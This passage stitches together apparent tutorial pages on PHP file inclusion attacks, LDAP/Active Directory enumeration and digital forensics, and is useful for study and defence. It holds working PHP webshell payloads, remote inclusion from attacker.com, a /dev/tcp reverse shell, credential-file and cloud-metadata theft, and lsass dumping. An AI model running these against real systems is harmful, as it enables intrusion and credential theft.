/var/lib/php5/sessions/sess_[sessionid] if the application stores user-supplied data in a session variable: $_session['username'] = $_get['user'];  // vulnerable set your username to `<?php system($_get["cmd"]); ?>`, find your session id from the `phpsessid` cookie, then include `/var/lib/php/sessions/sess_yoursessid`. lfi to rce: other paths upload + include the most reliable rce path when file upload exists anywhere on the application:

1. find a file upload endpoint (avatar, profile photo, document upload, etc.)
2. upload a php webshell disguised with a permitted extension: `shell.jpg` containing `<?php system($_get['cmd']); ?>`
3. determine the upload path (often disclosed in the response, html, or via directory listing)
4. include it: `?page=../../../../var/www/html/uploads/shell.jpg`

the extension doesn't matter to `include()` — it executes php regardless. temp file race (php + `/tmp`) php stores uploaded files temporarily in `/tmp/phpxxxxxx` during the request. in a multipart file upload, you can:
1. upload a file containing php
2. simultaneously include `/tmp/phpxxxxxx` during the upload window

this is a race condition and unreliable, but tools like `phpggc` automate it. mostly ctf-relevant. pearcmd (docker + php cli) a more modern technique abusing `pearcmd.php` (installed with php cli in many docker images): ?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?php system($_get['cmd'])?>+/tmp/shell.php creates `/tmp/shell.php`, then include it. detailed in hacktricks — relevant for dockerised php apps. phpinfo() + race condition if `phpinfo()` is exposed, it reveals the exact path of uploaded temp files in real time. automation:
1. script sends a multipart upload in a loop
2. second thread reads phpinfo() to get the temp path
3. third thread immediately includes the temp path

tools: `phpinfolfi.py` (insomniasec). reliable when phpinfo() is accessible. remote file inclusion (rfi) **rfi** is when the include function fetches a file from a remote url. it requires `allow_url_include=on` (off by default since php 5.2) and `allow_url_fopen=on`. ?page=http://attacker.com/shell.php
?page=http://attacker.com/shell.txt the `.txt` extension works just as well — php executes the response body as php regardless of the remote file extension.

**setup:** # host shell on your attacker machine
echo '<?php system($_get["cmd"]); ?>' > shell.php
python3 -m http.server 80 then: `?page=http://your_ip/shell.php&cmd=id`

**why it's rare in modern environments:**
- `allow_url_include` is disabled by default
- wafs typically block outbound http from web server processes
- php 7+ changed defaults aggressively

if you're testing an old php app (5.x era) or a ctf box, always try rfi — it's the easiest path to rce when it works. sensitive files — linux when you have lfi and can't reach rce immediately, reading sensitive files is your primary objective. these are the targets that matter: credentials & auth /etc/passwd                    — user list, home dirs, shells
/etc/shadow                    — hashed passwords (needs root read)
/etc/group                     — group memberships
/home/user/.ssh/id_rsa         — ssh private key
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa
/home/user/.bash_history       — command history (goldmine)
/root/.bash_history
/home/user/.mysql_history
/home/user/.psql_history application config /var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php    — wordpress db creds
/var/www/html/configuration.php  — joomla
/var/www/html/config/database.php  — laravel
/etc/phpmyadmin/config.inc.php
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf web server config /etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf  — virtual host paths
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf system / kernel info /proc/version                  — kernel version and compiler info
/proc/cmdline                  — kernel boot params (sometimes creds)
/proc/self/environ             — current process env vars (http headers here)
/proc/self/cmdline             — exact command line of current process
/proc/self/cwd                 — symlink to working dir (resolve with readlink)
/proc/self/fd/[n]              — file descriptors (fd/0=stdin, fd/1=stdout)
/proc/net/tcp                  — open tcp connections (hex encoded)
/proc/net/arp                  — arp table (internal network mapping)
/etc/os-release                — distro info
/etc/hostname
/etc/hosts
/etc/resolv.conf               — dns servers
/etc/crontab
/var/spool/cron/crontabs/root reading `/proc/net/tcp` this file lists all tcp connections in hex. column 2 is local address:port, column 3 is remote. port 80 in hex is `0050`.  sl  local_address rem_address   st
  0: 0100007f:1f91 00000000:0000 0a   ← 127.0.0.1:8081 listening reverse the byte order of each group and convert to decimal to get actual ip:port. this reveals internal services not visible from outside. ssh keys — the big win if you find an ssh private key: curl -s 'http://target/?page=../../../../home/john/.ssh/id_rsa' > john_id_rsa
chmod 600 john_id_rsa
ssh -i john_id_rsa john@target if the key is passphrase-protected: ssh2john john_id_rsa > john.hash
john --wordlist=/usr/share/wordlists/rockyou.txt john.hash sensitive files — windows windows paths use `\` but `/` also works in most php builds on windows. include both variants: system files c:/windows/win.ini                         — proof of file read
c:/windows/system32/drivers/etc/hosts
c:/windows/repair/sam                      — hashed local creds (if readable)
c:/windows/repair/system
c:/windows/system32/config/sam             — (usually locked by os)
c:/windows/system32/config/system
c:/windows/system32/config/security web server configs c:/xampp/apache/conf/httpd.conf
c:/xampp/filezillaftp/filezilla server.xml  — ftp creds
c:/xampp/mercurymail/mercury.ini
c:/xampp/sendmail/sendmail.ini
c:/xampp/mysql/data/mysql/user.myd         — mysql user table
c:/program files/apache group/apache2/conf/httpd.conf
c:/inetpub/wwwroot/web.config              — iis config, connection strings
c:/inetpub/wwwroot/global.asa iis logs c:/inetpub/logs/logfiles/w3svc1/u_ex[date].log
c:/windows/system32/logfiles/httperr/httperr.log application credentials c:/users/[user]/appdata/roaming/filezilla/recentservers.xml
c:/users/[user]/appdata/roaming/filezilla/sitemanager.xml
c:/xampp/filezillaftp/filezilla server.xml
c:/program files/filezilla server/filezilla server.xml **win.ini as a quick check:**
if `?page=c:/windows/win.ini` returns the content starting with `[fonts]`, you have confirmed file read on windows. fuzzing for lfi manual traversal is slow. automate it with `ffuf` and a wordlist. basic ffuf fuzz ffuf -u 'http://target/index.php?page=fuzz' \
  -w /usr/share/seclists/fuzzing/lfi/lfi-gracefulsecurity-linux.txt \
  -fw 0 -mc 200 with traversal prefix ffuf -u 'http://target/index.php?page=fuzz' \
  -w /usr/share/seclists/fuzzing/lfi/lfi-gracefulsecurity-linux.txt \
  -b 'phpsessid=abcd1234' \
  -h 'user-agent: mozilla/5.0' \
  -mc 200 -fw 0 seclists lfi wordlists /usr/share/seclists/fuzzing/lfi/lfi-gracefulsecurity-linux.txt
/usr/share/seclists/fuzzing/lfi/lfi-gracefulsecurity-windows.txt
/usr/share/seclists/fuzzing/lfi/lfi-jhaddix.txt
/usr/share/seclists/fuzzing/lfi/lfi-etc-files-of-interest.txt lfimap `lfimap` automates wrapper testing, rce checking, and log poisoning: pip3 install lfimap
lfimap -u 'http://target/index.php?page=test' --lfi --rfi --rce burp suite intruder for authenticated applications, use burp intruder with a sniper attack on the file parameter using the same seclists wordlists. filter by response length deviation from baseline. full exploitation workflow step 1 — confirm the vulnerability curl -s 'http://target/index.php?page=../../../../etc/passwd'
# look for: root:x:0:0:root step 2 — enumerate the environment # kernel and os
curl -s 'http://target/?page=../../../../proc/version'
curl -s 'http://target/?page=../../../../etc/os-release'

# running user
curl -s 'http://target/?page=../../../../proc/self/environ'

# internal services
curl -s 'http://target/?page=../../../../proc/net/tcp'

# web root (often disclosed by error or proc/self/cwd)
curl -s 'http://target/?page=../../../../proc/self/cmdline' | tr '\0' ' ' step 3 — read sensitive files # application config first
curl -s 'http://target/?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
curl -s 'http://target/?page=php://filter/convert.base64-encode/resource=../.env' | base64 -d

# ssh keys
for user in $(curl -s 'http://target/?page=../../../../etc/passwd' | cut -d: -f1); do
  echo "[*] trying $user"
  curl -s "http://target/?page=../../../../home/$user/.ssh/id_rsa"
done step 4 — escalate to rce # try wrappers first (no prereqs)
curl -s 'http://target/?page=php://filter/convert.base64-encode/resource=/etc/passwd'

# if allow_url_include=on:
curl -x post 'http://target/?page=php://input&cmd=id' --data '<?php system($_get["cmd"]); ?>'

# log poisoning
curl -a '<?php system($_get["cmd"]); ?>' 'http://target/'
curl -s 'http://target/?page=../../../../var/log/apache2/access.log&cmd=id' step 5 — reverse shell # url-encode the reverse shell command
curl -s 'http://target/?page=../../../../var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2fyour_ip%2f4444+0%3e%261%27'

# listener
nc -lvnp 4444 lfi in other languages lfi-class vulnerabilities exist outside php wherever user input controls a file path. python (flask/django) # vulnerable
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(filename)  # no sanitisation exploit: `?file=../../../../etc/passwd`

`send_file()` won't execute python, but you can read any file the process can access. java (spring/servlet) // vulnerable
string file = request.getparameter("page");
new fileinputstream("/var/www/" + file); java path traversal works identically. `../` sequences work even on windows with spring. node.js // vulnerable
app.get('/file', (req, res) => {
  fs.readfile('./public/' + req.query.name, (err, data) => {
    res.send(data);
  });
}); `?name=../../../../etc/passwd` — identical traversal.

**key difference:** these languages don't execute included files as code (no direct lfi→rce via wrappers). your goal is information disclosure: config files, `.env`, `/proc`, aws metadata at `169.254.169.254`. cloud metadata via lfi (ssrf adjacent) if the vulnerable application runs on aws, gcp, or azure, and the lfi allows fetching urls (rfi path or ssrf), the cloud metadata endpoint is a critical target.

**aws imdsv1:** ?page=http://169.254.169.254/latest/meta-data/
?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name returns: `accesskeyid`, `secretaccesskey`, `token` — temporary aws credentials. use them with `aws-cli` to enumerate/exfiltrate s3, ec2, etc.

**gcp:** ?page=http://metadata.google.internal/computemetadata/v1/instance/service-accounts/default/token **azure:** ?page=http://169.254.169.254/metadata/instance?api-version=2021-02-01 this is only reachable if `allow_url_fopen=on` and `allow_url_include=on`, or via a server-side request from a framework. pure path traversal lfi won't reach network endpoints. detection & defence **for defenders — what to look for in logs:** ../  in url parameters
%2e%2e  url encoded traversal
php://  stream wrapper prefix
file://  scheme prefix
/etc/passwd  or other sensitive paths in parameters
data://  base64 payloads **grep log files:** grep -e '(\.\./|%2e%2e|php://|file://|/etc/passwd|/etc/shadow)' /var/log/apache2/access.log **hardening:** **safe code pattern:** $allowed = ['home', 'about', 'contact'];
$page = $_get['page'];
if (!in_array($page, $allowed)) {
    die('invalid page');
}
include($page . '.php'); whitelist input — never trust path components from the user.

title: LDAP – Directory Enumeration & Active Directory Recon
summary: LDAP is the backbone of Active Directory. Learn to query it anonymously and with credentials to extract users, groups, computers, and policies — essential for b
body:
ldap – directory enumeration & active directory recon ldap is the backbone of active directory. learn to query it anonymously and with credentials to extract users, groups, computers, and policies — essential for both ad administration and offensive enumeration. tools ldap active-directory enumeration pentesting what is ldap? **lightweight directory access protocol (ldap)** is a protocol for reading and writing directory services — most commonly **microsoft active directory**. it organises objects (users, groups, computers, ous) in a hierarchical tree. ldap structure every object has a **distinguished name (dn)** that describes its full path: cn=john smith,ou=sales,dc=corp,dc=local ldapsearch – the core tool `ldapsearch` queries an ldap server directly from the command line. syntax: `ldapsearch [options] [filter] [attributes]` # anonymous bind -- check if null session is allowed
ldapsearch -x -h ldap://192.168.1.10 -b '' -s base '(objectclass=*)' namingcontexts

# get base dn of the domain
ldapsearch -x -h ldap://192.168.1.10 -b '' -s base namingcontexts

# authenticated query (plaintext credentials)
ldapsearch -x -h ldap://192.168.1.10 -d 'cn=jsmith,dc=corp,dc=local' -w 'password123' \
  -b 'dc=corp,dc=local' '(objectclass=user)'

# shorthand with upn-style bind dn
ldapsearch -x -h ldap://192.168.1.10 -d 'jsmith@corp.local' -w 'password123' \
  -b 'dc=corp,dc=local' '(objectclass=user)' anonymous / null bind enumeration many older or misconfigured ldap servers allow queries without credentials — a **null bind**. this is a critical misconfiguration in ad environments. # test for anonymous bind
ldapsearch -x -h ldap://192.168.1.10 -b 'dc=corp,dc=local'

# dump all users anonymously
ldapsearch -x -h ldap://192.168.1.10 -b 'dc=corp,dc=local' '(objectclass=person)' \
  cn samaccountname mail userprincipalname

# dump all groups
ldapsearch -x -h ldap://192.168.1.10 -b 'dc=corp,dc=local' '(objectclass=group)' \
  cn member description

# dump all computers
ldapsearch -x -h ldap://192.168.1.10 -b 'dc=corp,dc=local' '(objectclass=computer)' \
  cn dnshostname operatingsystem useful ldap filters # find domain admins members
ldapsearch -x -h ldap://dc01 -d 'user@corp.local' -w 'pass' \
  -b 'dc=corp,dc=local' \
  '(memberof=cn=domain admins,cn=users,dc=corp,dc=local)' \
  cn samaccountname

# find kerberoastable accounts (have spn set)
ldapsearch -x -h ldap://dc01 -d 'user@corp.local' -w 'pass' \
  -b 'dc=corp,dc=local' \
  '(&(objectclass=user)(serviceprincipalname=*))' \
  cn samaccountname serviceprincipalname

# find accounts with password never expires
ldapsearch -x -h ldap://dc01 -d 'user@corp.local' -w 'pass' \
  -b 'dc=corp,dc=local' \
  '(useraccountcontrol:1.2.840.113556.1.4.803:=65536)' \
  cn samaccountname

# find description fields (often contain passwords)
ldapsearch -x -h ldap://dc01 -d 'user@corp.local' -w 'pass' \
  -b 'dc=corp,dc=local' \
  '(&(objectclass=user)(description=*))' \
  cn description samaccountname ldapdomaindump – structured ad dump `ldapdomaindump` extracts the entire domain structure and outputs html/json/csv reports — ideal for a quick overview. # install
pip3 install ldapdomaindump

# dump with credentials
ldapdomaindump -u 'corp.local\jsmith' -p 'password123' 192.168.1.10

# dump with upn format
ldapdomaindump -u 'jsmith@corp.local' -p 'password123' ldap://192.168.1.10 -o ./ldap-dump/

# anonymous (if null bind allowed)
ldapdomaindump 192.168.1.10 -o ./ldap-anon/

# output files created:
# domain_users.html / .json / .grep
# domain_groups.html / .json / .grep
# domain_computers.html / .json / .grep
# domain_policy.html / .json / .grep windapsearch – fast ad enumeration `windapsearch` is a go tool built specifically for ad ldap enumeration with pre-built query modules. # install
git clone https://github.com/ropnop/windapsearch && cd windapsearch
go build -o windapsearch cmd/windapsearch/main.go

# enumerate all users
./windapsearch -d corp.local -u jsmith@corp.local -p 'password123' -m users

# enumerate domain admins
./windapsearch -d corp.local -u jsmith@corp.local -p 'password123' -m privileged-users

# enumerate computers
./windapsearch -d corp.local -u jsmith@corp.local -p 'password123' -m computers

# find unconstrained delegation accounts
./windapsearch -d corp.local -u jsmith@corp.local -p 'password123' -m unconstrained

# custom ldap filter
./windapsearch -d corp.local -u jsmith@corp.local -p 'password123' \
  --filter '(admincount=1)' --attrs cn,samaccountname nmap nse scripts # check if anonymous bind is allowed
nmap -p 389 --script ldap-rootdse 192.168.1.10

# brute-force credentials
nmap -p 389 --script ldap-brute --script-args ldap.base='dc=corp,dc=local' 192.168.1.10

# search with credentials
nmap -p 389 --script ldap-search \
  --script-args ldap.username='cn=jsmith,dc=corp,dc=local',ldap.password='password123',\
ldap.qfilter='users',ldap.attrib='samaccountname' 192.168.1.10 python ldap3 – scripted queries from ldap3 import server, connection, all, ntlm

server = server('192.168.1.10', get_info=all)

# bind with credentials
conn = connection(server, user='corp\\jsmith', password='password123', authentication=ntlm)
conn.bind()

# search for all users
conn.search(
    search_base='dc=corp,dc=local',
    search_filter='(objectclass=user)',
    attributes=['cn', 'samaccountname', 'mail', 'description']
)

for entry in conn.entries:
    print(entry.samaccountname, entry.description)

# anonymous bind attempt
conn_anon = connection(server)
print('anonymous bind:', conn_anon.bind()) real-world use cases **it administration / identity management**
- query ad to generate user reports, audit group memberships, or find stale accounts for cleanup
- automate user provisioning scripts using `ldap3` — create, modify, and disable accounts programmatically
- find all accounts with passwords set to never expire for a security compliance audit
- integrate applications with ad authentication using ldap bind for sso **penetration testing / red team**
- after gaining a domain foothold, enumerate users and groups to identify high-value targets
- find service accounts with spns set — prime targets for kerberoasting
- check `description` fields — admins frequently store temporary passwords there
- map group memberships to understand privilege paths: who can become domain admin?
- find computers with unconstrained delegation — a classic privilege escalation route
- dump the entire domain to json with `ldapdomaindump` and analyse offline ctf / htb workflow # step 1: discover ldap
nmap -p 389,636,3268 --open <target>

# step 2: get base dn (works without credentials)
ldapsearch -x -h ldap://<target> -b '' -s base namingcontexts

# step 3: try anonymous bind
ldapsearch -x -h ldap://<target> -b 'dc=corp,dc=local' '(objectclass=*)' | head -50

# step 4: with creds -- dump everything
ldapdomaindump -u 'corp.local\<user>' -p '<pass>' <target> -o ./dump/

# step 5: hunt for credentials in description fields
ldapsearch -x -h ldap://<target> -d '<user>@corp.local' -w '<pass>' \
  -b 'dc=corp,dc=local' '(description=*)' cn samaccountname description \
  | grep -i 'description\|cn:'

# step 6: find spns for kerberoasting
ldapsearch -x -h ldap://<target> -d '<user>@corp.local' -w '<pass>' \
  -b 'dc=corp,dc=local' '(serviceprincipalname=*)' samaccountname serviceprincipalname

# step 7: find as-rep roastable users (no preauth required)
ldapsearch -x -h ldap://<target> -d '<user>@corp.local' -w '<pass>' \
  -b 'dc=corp,dc=local' \
  '(useraccountcontrol:1.2.840.113556.1.4.803:=4194304)' \
  samaccountname - anonymous bind on port 389 is a common first-blood path on htb windows machines
- the `description` attribute is a goldmine — filter with `(description=*)` and grep for `pass`, `temp`, `cred`
- `admincount=1` finds accounts that are (or were) in privileged groups
- if you have any valid domain creds, `ldapdomaindump` gives you a full html report in seconds
- ldap port 389 open but 636 closed? try plaintext — credentials in the clear may be captured by other challenges on the network quick reference - `-x` — simple authentication (not sasl)
- `-h ldap://<host>` — server uri
- `-d '<bind dn>'` — bind as this identity
- `-w '<password>'` — password (use `-w` to prompt)
- `-b '<base dn>'` — where to start searching
- `-s base|one|sub` — search scope
- `-l` / `-ll` / `-lll` — progressively cleaner output

**default ports:** 389 (ldap), 636 (ldaps), 3268 (global catalog)

**one-liner user dump:**
`ldapsearch -x -h ldap://<dc> -d 'user@corp.local' -w 'pass' -b 'dc=corp,dc=local' '(objectclass=user)' samaccountname | grep samaccountname`

title: IT Forensics
summary: Digital forensics from first principles — evidence acquisition, disk and memory analysis, Windows and Linux artifacts, network forensics, and anti-forensics tec
body:
it forensics digital forensics from first principles — evidence acquisition, disk and memory analysis, windows and linux artifacts, network forensics, and anti-forensics techniques from a red team perspective. learn forensics dfir volatility autopsy memory disk windows linux incident-response digital forensics is the science of recovering, preserving, and analysing electronic evidence. it sits at the intersection of law enforcement, incident response, and offensive security — and understanding it deeply makes you a better attacker, defender, and investigator. a red teamer who understands forensics knows what traces they leave behind. an analyst who understands attacker ttps knows where to look.

forensics follows a strict methodology because evidence that can't be proven unmodified is worthless in court — and often worthless in incident response too. every step matters: how you acquire data, how you hash it, how you document your chain of custody. the forensic process every forensic investigation follows the same core phases regardless of whether it's a criminal case or a corporate breach:

**1. identification** — determine what devices and data sources are relevant. laptops, phones, servers, cloud logs, network captures, usb drives.

**2. preservation** — protect evidence from modification. this means write-blocking physical disks before imaging, capturing volatile memory before powering down, and documenting everything with timestamps.

**3. acquisition** — create forensic copies (images). never work on originals. images must be bit-for-bit copies with cryptographic hashes to prove integrity.

**4. analysis** — examine the acquired data using forensic tools. recover deleted files, parse artefacts, build timelines, correlate events.

**5. documentation** — every finding must be reproducible and documented. screenshots, tool output, hash values, methodology notes.

**6. reporting** — present findings in a clear, defensible format for technical and non-technical audiences. order of volatility evidence must be collected in order of volatility — most transient first. waiting to image ram until you've made a disk image means losing all running processes, network connections, and decrypted keys. **red team implication:** attacker tools that live only in memory (fileless malware, powershell in memory, reflective dll injection) leave nothing on disk for forensic recovery — only ram captures can reveal them. evidence acquisition disk imaging forensic images are bit-for-bit copies including empty space, deleted file remnants, and slack space. the two standard formats are **raw/dd** (`.img`, `.dd`) and **ewf/expert witness format** (`.e01`, `.e02`) which supports compression and embedded metadata.

always use a **hardware write blocker** or software equivalent to prevent accidental writes to the original disk. # identify target device
lsblk
fdisk -l

# basic dd image (raw format)
dd if=/dev/sdb of=/evidence/disk.img bs=4m conv=noerror,sync status=progress

# hash original before and after
md5sum /dev/sdb > /evidence/disk.md5
sha256sum /dev/sdb > /evidence/disk.sha256

# dcfldd — forensic dd with built-in hashing
dcfldd if=/dev/sdb of=/evidence/disk.img hash=sha256 hashlog=/evidence/hash.log bs=4m

# verify image integrity
md5sum /evidence/disk.img
# must match hash of original

# create e01 (ewf) image with ewfacquire (libewf)
ewfacquire /dev/sdb
# prompts for case info, examiner name, output path

# mount e01 for analysis (read-only)
ewfmount /evidence/disk.e01 /mnt/evidence
mount -o ro,loop,noatime /mnt/evidence/ewf1 /mnt/disk # on target (compromised machine) — pipe dd over netcat
dd if=/dev/sdb bs=4m | nc 192.168.1.10 4444

# on analyst machine — receive and save
nc -l -p 4444 | dd of=/evidence/remote_disk.img bs=4m

# or use ssh (more reliable, encrypted)
ssh user@target 'dd if=/dev/sdb bs=4m' | dd of=/evidence/remote_disk.img bs=4m

# verify with hashes on both ends
ssh user@target 'sha256sum /dev/sdb'
sha256sum /evidence/remote_disk.img memory acquisition ram capture is time-critical. tools must be pre-staged on the target (or run from a usb) before you begin. # lime (linux memory extractor) — loadable kernel module
# build for target kernel version, or download pre-built
git clone https://github.com/504ensicslabs/lime
cd lime/src && make

# load module and dump to file
insmod lime-$(uname -r).ko "path=/evidence/mem.lime format=lime"

# dump over network (no disk write on target)
insmod lime-*.ko "path=tcp:4444 format=lime"
nc -l -p 4444 > /evidence/remote_mem.lime   # on analyst machine

# /proc/mem (limited, not full dump)
cat /proc/kcore > /evidence/kcore.dump # winpmem (open source, from velocidex)
# https://github.com/velocidex/winpmem
winpmem_mini_x64.exe -o c:\evidence\memory.raw

# magnet ram capture (gui tool, free)
# dumps to raw format automatically

# dumpit (comae/magnet)
dumpit.exe /o c:\evidence\memory.dmp

# using comsvcs.dll lolbas (red team / no external tool)
# run from admin cmd
rundll32.exe c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id c:\evidence\lsass.dmp full
# note: this only dumps lsass, not full memory

# full memory via task manager (limited)
# task manager > details > right-click process > create dump file disk forensics — file system analysis file systems ntfs — deep dive ntfs stores everything in the **master file table (mft)**. every file and directory has an mft entry containing metadata, timestamps, and either the data itself (for small files) or pointers to data runs.

**critical ntfs artefacts:**
- **$mft** — the master file table, one entry per file/directory. can recover deleted entries.
- **$usnjrnl ($extend\$usnjrnl:$j)** — change journal logs every file operation (create, delete, rename, modify). survives file deletion.
- **$logfile** — ntfs transaction log. can reconstruct recent operations.
- **$recycle.bin** — deleted files with original path (`$i` files) and content (`$r` files).
- **ads (alternate data streams)** — hidden data streams attached to files (common malware hiding spot).

**ntfs timestamp manipulation** is a critical forensic concept:
- each file has **two sets of timestamps**: `$standard_information` (visible in explorer) and `$file_name` (harder to fake, stored in the mft directory entry).
- attackers use `timestomp` to modify `$standard_information` timestamps.
- forensic analysts compare both sets — a mismatch is a strong indicator of tampering. # install
apt install sleuthkit

# list partitions in an image
mmls disk.img

# list files in a partition (offset from mmls output, e.g. 2048 sectors)
fls -o 2048 disk.img
# -r  recursive
# -d  show deleted files only
fls -o 2048 -rd disk.img

# get inode info for a file
istat -o 2048 disk.img <inode_number>

# extract a file by inode
icat -o 2048 disk.img <inode_number> > /evidence/recovered_file

# walk the mft
fsstat -o 2048 disk.img          # filesystem metadata
ffind -o 2048 disk.img <inode>   # find filename for inode

# recover deleted files (data carving via tsk)
tsk_recover -o 2048 disk.img /evidence/recovered/

# timeline generation
fls -o 2048 -m / disk.img > /evidence/bodyfile.txt
mactime -b /evidence/bodyfile.txt -d > /evidence/timeline.csv # extract mft from a mounted image or live system
cp /mnt/disk/\$mft /evidence/mft

# analyzemft — python tool
pip install analyzemft
analyzemft.py -f /evidence/mft -o /evidence/mft_output.csv

# parse with mftparser (volatility plugin or standalone)
# shows macb timestamps for $standard_info and $file_name

# usn journal extraction
# the journal is a sparse file — use fsutil or ntfs tools
fsutil usn readdata c: > usn_raw.txt
# or extract the $j stream
icat -o 2048 disk.img <mft_entry_for_usnjrnl> > usnjrnl_j

# parse with usnjrnl.py
git clone https://github.com/poorbillionaire/usn-journal-parser
python usn.py -f usnjrnl_j -o /evidence/usnjrnl.csv file carving file carving recovers files from raw disk space using **file signatures (magic bytes)** — it doesn't rely on filesystem metadata, so it works even when the mft entries are overwritten. # foremost — carves by file signatures
foremost -t jpg,pdf,doc,zip,exe -i /evidence/disk.img -o /evidence/carved/
# results organised by file type in subdirectories

# scalpel — faster, more configurable
# edit /etc/scalpel/scalpel.conf to enable file types
scalpel /evidence/disk.img -o /evidence/scalpel_out/

# binwalk — great for embedded firmware and archives
binwalk /evidence/disk.img
binwalk -e /evidence/disk.img   # extract all found files
binwalk --dd='.*' /evidence/disk.img  # extract everything

# photorec — recovers 480+ file types including deleted
photorec /evidence/disk.img

# bulk_extractor — extracts features (emails, urls, credit cards, keys)
bulk_extractor -o /evidence/bulk_out/ /evidence/disk.img windows artifacts windows is a goldmine of forensic artefacts. knowing where to look is half the job. registry the windows registry stores system configuration, user activity, and program execution history. registry hives are binary files on disk: # regripper — automates extraction of forensic artefacts from hives
git clone https://github.com/keydet89/regripper3.0
cd regripper3.0

# run all plugins against a hive
perl rip.pl -r /evidence/ntuser.dat -f ntuser > /evidence/ntuser_report.txt
perl rip.pl -r /evidence/system -f system > /evidence/system_report.txt
perl rip.pl -r /evidence/software -f software > /evidence/software_report.txt

# key artefacts extracted:
# - recentdocs (recently opened files)
# - userassist (gui program execution, run count, timestamps)
# - muicache (program execution)
# - typedurls (urls typed in ie/edge address bar)
# - runmru (commands run via win+r)
# - shellbags (folder access history, even for deleted folders)
# - bam/dam (background activity monitor — program execution times)
# - networklist (previously connected wifi/wired networks)
# - usb device history

# recmd (eric zimmermann tools) — windows
recmd.exe -f c:\evidence\ntuser.dat --csv c:\evidence\output\

# live registry from running windows (admin)
reg export hklm c:\evidence\hklm_export.reg
reg export hkcu c:\evidence\hkcu_export.reg event logs windows event logs (`*.evtx`) are stored in `c:\windows\system32\winevt\logs\`. critical logs for forensics: # parse .evtx on linux with python-evtx
pip install python-evtx
evtxdump.py security.evtx | grep -a5 'eventid.*4624'

# chainsaw — fast evtx hunting with sigma rules
git clone https://github.com/withsecurelabs/chainsaw
./chainsaw hunt /evidence/evtx/ -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv --output /evidence/chainsaw_results

# search for specific event ids
./chainsaw search -t 'event.system.eventid: =4625' /evidence/security.evtx

# hayabusa — another fast evtx analyser
git clone https://github.com/yamato-security/hayabusa
./hayabusa csv-timeline -d /evidence/evtx/ -o /evidence/timeline.csv
./hayabusa logon-summary -d /evidence/evtx/
./hayabusa pivot-keywords-list -d /evidence/evtx/

# windows native (powershell)
get-winevent -path c:\evidence\security.evtx -filterxpath "*[system[eventid=4624]]" | select timecreated, message | export-csv logons.csv

# key logon types:
# type 2  = interactive (local keyboard)
# type 3  = network (smb, net use)
# type 4  = batch (scheduled task)
# type 5  = service
# type 7  = unlock
# type 8  = networkcleartext (basic auth)
# type 10 = remoteinteractive (rdp)
# type 11 = cachedinteractive windows execution artifacts these artefacts prove that a file was executed even if the file itself has been deleted: # ── prefetch ──
# location: c:\windows\prefetch\*.pf
# contains: program name, run count, last run time (up to 8), loaded dlls/files
# only on windows workstation (disabled by default on server)

# parse with pecmd (eric zimmermann)
pecmd.exe -d c:\windows\prefetch --csv c:\evidence\prefetch\
pecmd.exe -f c:\windows\prefetch\mimikatz.exe-xxxxx.pf

# on linux with prefetch.py
git clone https://github.com/poorbillionaire/windows-prefetch-parser
python prefetch.py -f /evidence/mimikatz.exe-xxxxx.pf

# ── shimcache (appcompatcache) ──
# hklm\system\currentcontrolset\control\session manager\appcompatcache
# tracks executables that have interacted with the os
# does not prove execution — only that the file existed and was accessed
# use appcompatcacheparser.exe or regripper appcompatcache plugin

appcompatcacheparser.exe -f c:\evidence\system --csv c:\evidence\shimcache\

# ── amcache ──
# location: c:\windows\appcompat\programs\amcache.hve
# tracks installed programs and recently executed files
# contains: sha1 hash of the executable (powerful — can identify malware)
amcacheparser.exe -f c:\evidence\amcache.hve --csv c:\evidence\amcache\

# ── userassist ──
# ntuser.dat: software\microsoft\windows\currentversion\explorer\userassist
# rot13-encoded program names, run count, last run timestamp
# use regripper userassist plugin or userassistview (nirsoft) # ── lnk files (shell link) ──
# created automatically when a file is opened
# location: c:\users\<user>\appdata\roaming\microsoft\windows\recent\
# contains: original file path, timestamps, volume serial number, mac address
# can reveal files accessed from external drives or network shares

# parse with lecmd (eric zimmermann)
lecmd.exe -d c:\users\user\appdata\roaming\microsoft\windows\recent --csv c:\evidence\lnk\

# ── jump lists ──
# recent + pinned files per application
# location:
#   c:\users\<user>\appdata\roaming\microsoft\windows\recent\automaticdestinations\*.automaticdestinations-ms
#   c:\users\<user>\appdata\roaming\microsoft\windows\recent\customdestinations\*.customdestinations-ms
# app id in filename maps to application (known list online)

jlecmd.exe -d c:\users\user\appdata\roaming\microsoft\windows\recent\automaticdestinations --csv c:\evidence\jumplists\

# ── shellbags ──
# tracks folder browsing history — even for deleted folders, network shares, removable drives
# usrclass.dat: local settings\software\microsoft\windows\shell\bagmru
# shows which folders were opened, in what order, and when

sbecmd.exe -d c:\users\user\appdata\local\microsoft\windows --csv c:\evidence\shellbags\ memory forensics with volatility volatility is the standard tool for ram analysis. version 3 is the current release (python-based, no profiles needed for modern os). # install
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3 && pip install -r requirements.txt

# basic usage
python3 vol.py -f /evidence/memory.raw <plugin>

# ── process analysis ──
# list processes (tree view)
python3 vol.py -f memory.raw windows.pstree

# list all process details
python3 vol.py -f memory.raw windows.pslist

# detect hidden/unlinked processes (rootkit detection)
python3 vol.py -f memory.raw windows.psscan

# compare pslist vs psscan — processes in psscan but not pslist = hidden

# process command lines
python3 vol.py -f memory.raw windows.cmdline

# dlls loaded by each process
python3 vol.py -f memory.raw windows.dlllist --pid 1234

# handles (files, registry keys, mutexes)
python3 vol.py -f memory.raw windows.handles --pid 1234

# dump a process executable
python3 vol.py -f memory.raw windows.dumpfiles --pid 1234

# ── network ──
# active and recently closed connections
python3 vol.py -f memory.raw windows.netstat
python3 vol.py -f memory.raw windows.netscan

# ── injected code ──
# find memory regions with executable + non-image backed pages (classic injection indicator)
python3 vol.py -f memory.raw windows.malfind
# -d to dump suspicious regions to files for further analysis
python3 vol.py -f memory.raw windows.malfind --dump

